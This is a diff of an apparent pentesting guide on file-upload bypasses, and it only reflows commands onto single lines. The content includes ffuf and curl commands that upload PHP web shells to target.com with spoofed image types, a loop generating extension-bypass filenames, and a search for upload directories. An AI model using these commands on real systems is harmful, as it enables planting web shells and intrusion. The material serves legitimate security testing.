@@ -210,12 +210,7 @@ perms = [''.join(c) for c in product(*[(ch.lower(), ch.upper()) for ch in ext])]
 wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/web-extensions.txt
 
 # Upload a file with each extension and look for non-blocked responses
-ffuf -u http://target.com/upload.php \
-  -X POST \
-  -F "file=@shell.FUZZ;type=image/jpeg" \
-  -F "submit=Upload" \
-  -w web-extensions.txt \
-  -mc 200 -fs <blocked_response_size>
+ffuf -u http://target.com/upload.php -X POST -F "file=@shell.FUZZ;type=image/jpeg" -F "submit=Upload" -w web-extensions.txt -mc 200 -fs <blocked_response_size>
 ```
 
 ### Fuzz with Burp Intruder
@@ -270,8 +265,7 @@ Generate a wordlist automatically:
 
 ```bash
 for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '...' ':'; do
-    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' \
-               '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
+    for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
         echo "shell${char}${ext}.jpg" >> upload_wordlist.txt
         echo "shell${ext}${char}.jpg" >> upload_wordlist.txt
         echo "shell.jpg${char}${ext}" >> upload_wordlist.txt
@@ -283,11 +277,7 @@ done
 Fuzz with generated list:
 
 ```bash
-ffuf -u http://target.com/upload.php \
-  -X POST \
-  -F "file=@shell.FUZZ;type=image/jpeg" \
-  -w upload_wordlist.txt \
-  -mc 200 -fs <blocked_size>
+ffuf -u http://target.com/upload.php -X POST -F "file=@shell.FUZZ;type=image/jpeg" -w upload_wordlist.txt -mc 200 -fs <blocked_size>
 ```
 
 ### .htaccess Upload (Apache)
@@ -352,11 +342,7 @@ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/
 grep 'image/' web-all-content-types.txt > image-content-types.txt
 
 # Fuzz
-ffuf -u http://target.com/upload.php \
-  -X POST \
-  -F "file=@shell.php;type=FUZZ" \
-  -w image-content-types.txt \
-  -mc 200 -fs <blocked_size>
+ffuf -u http://target.com/upload.php -X POST -F "file=@shell.php;type=FUZZ" -w image-content-types.txt -mc 200 -fs <blocked_size>
 ```
 
 ---
@@ -488,9 +474,7 @@ If the upload location isn't disclosed in the response:
 
 ```bash
 # Try common paths
-ffuf -u http://target.com/FUZZ/shell.php \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-  -mc 200
+ffuf -u http://target.com/FUZZ/shell.php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200
 
 # Common upload dirs
 /uploads/ /upload/ /files/ /images/ /img/ /media/ /assets/
@@ -508,9 +492,7 @@ When direct execution is blocked but LFI exists — upload to a readable path, i
 
 ```bash
 # Step 1: upload shell disguised as image
-curl -X POST http://target.com/upload.php \
-  -F "file=@shell.php.jpg" \
-  -F "Content-Type: image/jpeg"
+curl -X POST http://target.com/upload.php -F "file=@shell.php.jpg" -F "Content-Type: image/jpeg"
 
 # Step 2: find the upload path (e.g., /uploads/shell.php.jpg)
 
